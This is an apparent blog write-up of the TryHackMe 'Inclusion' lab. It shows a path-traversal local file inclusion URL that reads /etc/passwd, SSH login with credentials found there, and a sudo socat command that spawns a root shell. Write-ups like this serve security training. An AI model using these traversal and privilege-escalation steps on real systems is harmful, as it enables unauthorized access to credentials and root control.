---
layout: post
title: "THM Writeup - Inclusion"
subtitle: "Try Hack Me - LFI"
date: 2021-07-14 
background: '/img/bg-write.jpg'
---

# THM ![Try Hack Me](https://img.shields.io/badge/-TryHackMe-black?style=flat-square&logo=tryhackme)

![1]

## Room name: Inclusion
<https://tryhackme.com/room/inclusion>


### Description: 
A beginner level LFI challenge.

### OS: ![Linux](https://img.shields.io/badge/Linux-black?style=flat-square&logo=linux)


Knowing that the challenge in this room is to exploit Local File Inclusion, we can begin by navigating to the website at the IP address on port 80.

Here we see a basic webpage sharing information about LFI and RFI exploitation. Clicking through some of the articles and observing the changes to the URL strings, we notice the following pattern.

```
http://127.0.0.1/article?name=lfiattack
```
The information after the "?" indicates a query string. We can use this to test for LFI exposure. To start, we use a basic search for common files that can give us the information we are seeing. These typically include:

> /etc/passwd<br>
> /etc/hosts<br>
> /etc/exports<br>

Starting with the following string gives us results immediately:

```html
http://127.0.0.1/article?name=../../../../etc/passwd
```
Interestingly enough, we see the results from /etc/passwd directly within the page and can quickly identify a username and password pair in cleartext.

```
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#f**********t:r**********d <-------
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```




## User Flag:
Using these details, we attempt to SSH into the server hosting the webpage and successfully connect. 

```bash
# ssh f*****t@127.0.0.1
f******t@inclusion:~$ 
```

We then list the directory contents and quickly find the user flag:
```bash
f*****t@inclusion:~$ ls
articles  user.txt
f*****t@inclusion:~$ cat user.txt 
6****************9
```

## Root Flag
Now that we have a user shell we can review what, if any SUDO permissions are available for use. To do so we run *sudo -l* to enumerate. We see that user f******t may run socat as SUDO. We reference GTFObins for an appropriate bypass. <https://gtfobins.github.io/gtfobins/socat/> 
```bash
User f*****t may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```
This being the case, we can attempt to run the binary and receive a root shell.

```bash
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
```
The process is successful however our root shell is missing a prompt. Since we are simply extracting the data from the root flag and know its, location, we dont necessarily need to stabilize. Moving on we identify the root.txt flag located in /root/root.txt and expose its contents.
```
whoami
root
cat /root/root.txt
4********9
```

## Takeaways

1. Local File Inclusion
2. ssh login with located credentials
3. sudo enumeration and exploitation of privilege using GTFObins

[1]:/img/roomicons/lfi.png
